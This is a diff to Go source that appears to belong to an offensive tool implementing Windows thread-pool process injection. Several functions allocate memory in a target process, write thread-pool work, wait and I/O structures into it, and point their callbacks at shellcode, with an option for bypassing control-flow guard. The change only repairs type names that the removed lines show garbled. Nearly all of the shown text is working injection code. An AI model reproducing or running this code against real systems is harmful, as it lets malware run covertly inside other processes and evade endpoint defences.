@@ -134,7 +134,7 @@ func executeVariant2(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 	output += "[+] Created work item structure associated with shellcode\n"
 
 	// Step 9: Read and modify the work item structure
-	var tpWork FULL_work item
+	var tpWork FULL_TP_WORK
 	// Copy the structure from our local process
 	for i := 0; i < int(unsafe.Sizeof(tpWork)); i++ {
 		*(*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(&tpWork)) + uintptr(i))) =
@@ -288,7 +288,7 @@ func executeVariant3(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 	output += "[+] Created wait item structure associated with shellcode\n"
 
 	// Step 6: Allocate memory for wait item in target process
-	var tpWait FULL_wait item
+	var tpWait FULL_TP_WAIT
 	tpWaitAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpWait)), PAGE_READWRITE)
 	if err != nil {
 		return output, fmt.Errorf("remote allocation for wait item failed: %w", err)
@@ -304,8 +304,8 @@ func executeVariant3(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 	output += fmt.Sprintf("[+] Wrote wait item structure (%d bytes)\n", bytesWritten)
 
 	// Step 8: Allocate and write direct item separately
-	pWaitStruct := (*FULL_wait item)(unsafe.Pointer(pTpWait))
-	var tpDirect direct item
+	pWaitStruct := (*FULL_TP_WAIT)(unsafe.Pointer(pTpWait))
+	var tpDirect TP_DIRECT
 	tpDirectAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpDirect)), PAGE_READWRITE)
 	if err != nil {
 		return output, fmt.Errorf("remote allocation for direct item failed: %w", err)
@@ -415,13 +415,13 @@ func executeVariant4(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 	output += "[+] Created IO item structure associated with shellcode\n"
 
 	// Step 7: Modify IO item - set callback and increment PendingIrpCount
-	pIoStruct := (*FULL_IO item)(unsafe.Pointer(pTpIo))
+	pIoStruct := (*FULL_TP_IO)(unsafe.Pointer(pTpIo))
 	pIoStruct.CleanupGroupMember.Callback = shellcodeAddr // Explicitly set callback
 	pIoStruct.PendingIrpCount++                           // Mark async I/O as pending
 	output += "[+] Modified IO item: set callback and incremented PendingIrpCount\n"
 
 	// Step 8: Allocate memory for IO item in target process
-	var tpIo FULL_IO item
+	var tpIo FULL_TP_IO
 	tpIoAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpIo)), PAGE_READWRITE)
 	if err != nil {
 		return output, fmt.Errorf("remote allocation for IO item failed: %w", err)
@@ -437,7 +437,7 @@ func executeVariant4(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 	output += fmt.Sprintf("[+] Wrote IO item structure (%d bytes)\n", bytesWritten)
 
 	// Step 10: Calculate remote direct item address
-	var dummyTpIo FULL_IO item
+	var dummyTpIo FULL_TP_IO
 	remoteTpDirectAddr := tpIoAddr + uintptr(unsafe.Offsetof(dummyTpIo.Direct))
 
 	// Step 11: Associate file with target's I/O completion port
